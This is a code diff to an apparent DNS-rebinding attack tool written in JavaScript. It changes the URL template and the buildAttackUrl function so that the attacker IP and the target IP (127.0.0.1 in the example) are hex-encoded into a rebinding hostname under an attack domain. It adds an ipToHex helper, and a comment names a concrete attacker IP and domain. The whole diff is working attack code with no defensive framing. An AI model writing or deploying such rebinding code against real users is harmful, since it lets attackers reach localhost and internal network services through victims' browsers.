@@ -65,7 +65,21 @@
     // ============================================================
 
     // -------- inlined manager (was manager-khara.js, dead code stripped) --------
-    const HOST_URL_TEMPLATE = "http://s-%1-%2-%3-%4-e.%5:%6/%7";
+    // Upstream LNA-branch DNS parser expects hex-encoded IPs separated by '.':
+    //   s-{hex(attackerIP)}.{hex(targetIP)}-{session}-{strategy}-e.{domain}
+    // e.g. attacker 138.68.154.81, target 127.0.0.1 →
+    //   s-8a449a51.7f000001-{session}-fs-e.dynamic.az2.website
+    // The atemporalzen fork (used by horizon, not horizon-lna) tolerates
+    // dotted-decimal IPs in the hostname, but upstream does NOT.
+    const HOST_URL_TEMPLATE = "http://s-%1.%2-%3-%4-e.%5:%6/%7";
+
+    // Encode IPv4 dotted-decimal as 8-char lowercase hex (e.g. "127.0.0.1" → "7f000001").
+    // Pass through anything that isn't a 4-octet IPv4 (CNAMEs, IPv6, etc.) unchanged.
+    const ipToHex = (ip) => {
+        const parts = ip.split('.');
+        if (parts.length !== 4) return ip;
+        return parts.map(p => parseInt(p, 10).toString(16).padStart(2, '0')).join('');
+    };
 
     const Frame = (id, url) => {
         let timer = null, errorCount = 0, interval = null;
@@ -105,8 +119,8 @@
     };
 
     const buildAttackUrl = () => HOST_URL_TEMPLATE
-        .replace("%1", CONFIG.attackHostIPAddress)
-        .replace("%2", CONFIG.targetHostIPAddress.replace(/-/g, '--'))
+        .replace("%1", ipToHex(CONFIG.attackHostIPAddress))
+        .replace("%2", ipToHex(CONFIG.targetHostIPAddress))
         .replace("%3", Math.floor(Math.random() * 2 ** 32))
         .replace("%4", CONFIG.rebindingStrategy)
         .replace("%5", CONFIG.attackHostDomain)
